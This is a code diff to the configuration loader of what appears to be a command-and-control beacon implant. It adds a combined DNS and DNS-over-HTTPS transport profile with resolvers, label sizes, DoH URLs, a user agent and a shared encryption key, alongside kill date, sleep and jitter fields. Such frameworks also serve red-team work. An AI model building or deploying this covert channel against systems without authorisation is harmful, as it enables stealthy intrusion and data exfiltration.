@@ -100,9 +100,42 @@ AgentConfig::AgentConfig()
 	this->sleep_delay         = packer->Unpack32();
 	this->jitter_delay        = packer->Unpack32();
 
+#elif defined(BEACON_DNS_DOH)
+	// Combined DNS+DoH profile layout (ProfileDNSDoH) is packed on the Go side
+	// pl_agent.go case "doh" as:
+	// [agent_type,
+	//  dns.domain, dns.resolvers, dns.qtype, dns.pkt_size, dns.label_size, dns.ttl,
+	//  doh.domain, doh.urls, doh.user_agent, doh.pkt_size, doh.label_size, doh.ttl,
+	//  mode,
+	//  listener_type, kill_date, working_time, sleep_seconds, jitter]
+	// Here we unpack in the same order and wire both transports to the shared
+	// global encrypt_key.
+	this->profile.dns.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.dns.resolvers   = packer->UnpackBytesCopy(&length);
+	this->profile.dns.qtype       = packer->UnpackBytesCopy(&length);
+	this->profile.dns.pkt_size    = packer->Unpack32();
+	this->profile.dns.label_size  = packer->Unpack32();
+	this->profile.dns.ttl         = packer->Unpack32();
+	this->profile.dns.encrypt_key = this->encrypt_key;
+
+	this->profile.doh.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.doh.urls        = packer->UnpackBytesCopy(&length);
+	this->profile.doh.user_agent  = packer->UnpackBytesCopy(&length);
+	this->profile.doh.pkt_size    = packer->Unpack32();
+	this->profile.doh.label_size  = packer->Unpack32();
+	this->profile.doh.ttl         = packer->Unpack32();
+	this->profile.doh.encrypt_key = this->encrypt_key;
+
+	this->profile.mode            = packer->UnpackBytesCopy(&length);
+	this->listener_type           = packer->Unpack32();
+	this->kill_date               = packer->Unpack32();
+	this->working_time            = packer->Unpack32();
+	this->sleep_delay             = packer->Unpack32();
+	this->jitter_delay            = packer->Unpack32();
+
 #endif
 
-#if defined(BEACON_DNS) || defined(BEACON_DOH)
+#if defined(BEACON_DNS) || defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
 	// DNS beacon uses a smaller per-chunk download size to improve
 	// reliability over the constrained DNS transport channel.
 	this->download_chunk_size = 0x8000; // 32 KB
